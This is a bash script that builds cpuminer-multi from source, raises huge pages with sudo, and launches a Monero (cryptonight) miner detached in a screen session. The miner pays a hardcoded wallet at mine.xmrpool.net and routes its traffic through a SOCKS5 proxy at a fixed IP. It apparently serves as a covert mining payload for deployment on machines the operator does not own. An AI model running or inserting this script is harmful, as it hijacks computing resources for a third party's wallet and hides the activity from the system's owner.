#!/bin/bash
sudo apt-get update
sudo apt-get install -y automake build-essential screen autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev
sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))
git clone https://github.com/tpruvot/cpuminer-multi && cd cpuminer-multi && ./autogen.sh
if [ ! "0" = `cat /proc/cpuinfo | grep -c avx2` ];
then
    CFLAGS="-O2 -mavx2" ./configure --with-crypto --with-curl
elif [ ! "0" = `cat /proc/cpuinfo | grep -c avx` ];
then
    CFLAGS="-O2 -mavx" ./configure --with-crypto --with-curl
else
    CFLAGS="-march=native" ./configure --with-crypto --with-curl
fi
make clean && make && screen -d -m ./cpuminer -a cryptonight -o stratum+tcp://mine.xmrpool.net:5555 -u 44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn.f3319bad0a4e5b2e7e7dd3d040ef87392831d2d4b5d81cc792b1e756fc94a48e+2000   -p 1  -x socks5://38.141.47.144:22089
